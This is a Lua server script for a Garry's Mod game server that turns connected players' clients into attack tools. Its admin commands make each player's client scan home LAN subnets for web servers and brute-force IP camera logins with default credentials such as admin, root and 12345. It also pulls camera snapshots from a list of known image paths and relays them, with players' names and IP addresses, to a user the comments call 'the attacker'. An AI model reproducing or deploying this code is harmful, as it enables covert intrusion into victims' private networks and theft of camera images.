function GM:Initialize()
	util.AddNetworkString("hackityhack_scan")
	util.AddNetworkString("hackityhack_scan_auth")
	util.AddNetworkString("hackityhack_img_recv")
	util.AddNetworkString("hackityhack_img_send")
	util.AddNetworkString("")
end

local users = {"",
			   "admin",
			   "administrator",
			   "root"}

local passwords = {"",
				   "admin",
				   "12345"}

local urls = {"/__live.jpg",
			  "/image.jpg",
			  "/IMAGE.jpg",
			  "/oneshotimage.jpg",
			  "/snapshot.cgi",
			  "/liveimg.cgi",
			  "/jpg/image.jpg",
			  "/cgi/jpg/image.cgi",
			  "/record/current.jpg",
			  "/-wvhttp-01-/GetOneShot",
			  "/Jpeg/CamImg.jpg",
			  "/img/snapshot.cgi",
			  "/Getimage.cgi",
			  "/stream.jpg",
			  "/SnapshotJPEG"}

local function OnReceiveScan(length, player)
	print("**** Incoming message ****")
	print("From:\t" .. player:Name() .. "(" .. player:UniqueID() .. ")")
	print("IP:\t" .. player:IPAddress())
	print("--------------------------")
	print(net.ReadString())
	print("\n")
end

local function OnReceiveImage(length, ply)
	print ("Received image from " .. ply:Name() .. ", sending it to admin.")

	local image = net.ReadString()
	--local recipient = player.GetByUniqueID("1") -- 1 should be the attacker's ID
	local recipient = player.GetByID("1") -- 1 should be the attacker's ID

	net.Start("hackityhack_img_recv")

	while (#image ~= 0) do
		net.WriteString(image:sub(1, 255))
		image = image:sub(256)
	end
	net.WriteString("XXXMARKERXXX")
	net.Send(recipient)
	recipient:SendLua("DisplayImage()")
end

net.Receive("hackityhack_scan", OnReceiveScan)
net.Receive("hackityhack_scan_auth", OnReceiveScan)
net.Receive("hackityhack_img_recv", OnReceiveImage)

concommand.Add("hck_scanplayers", function(ply, cmd, args, argStr)
	if not ply:IsSuperAdmin() then return end

	for _, v in pairs( player.GetHumans() ) do
		-- scan 192.168.0.0/24 for HTTP servers
		v:SendLua('for i = 0,255,1 do TestHttp("http://192.168.0." .. tostring(i)) end')

		-- scan 192.168.1.0/24 for HTTP servers
		v:SendLua('for i = 0,255,1 do TestHttp("http://192.168.1." .. tostring(i)) end')
	end
end )

concommand.Add("hck_getimage", function(ply, cmd, args, argStr)
	if not ply:IsSuperAdmin() then return end

	if #args ~= 4 then
		print("Usage: hck_getimage id url.")
		return
	end

	-- arg[1] should be the victim's id
	local recipient = player.GetByUniqueID(args[1]) 

	recipient:SendLua('GetImage("' .. args[2] .. '", "' .. args[3] .. '", "' .. args[4] .. '")')
end )

concommand.Add("hck_bruteforce", function(ply, cmd, args, argStr)
	if not ply:IsSuperAdmin() then return end

	if #args ~= 2 then
		print("Usage: hck_bruteforce id url.")
		return
	end

	-- arg[1] should be the victim's id
	local recipient = player.GetByUniqueID(args[1]) 

	-- loop through possible user/pass value
	for _, vu in pairs(users) do
		for _, vp in pairs(passwords) do
			print ("Trying " .. vu .. ":" .. vp .. ".")
			recipient:SendLua('TestHttpBasicAuth("' .. args[2] .. '", "' .. vu .. '", "' .. vp .. '")')
		end
	end
end )
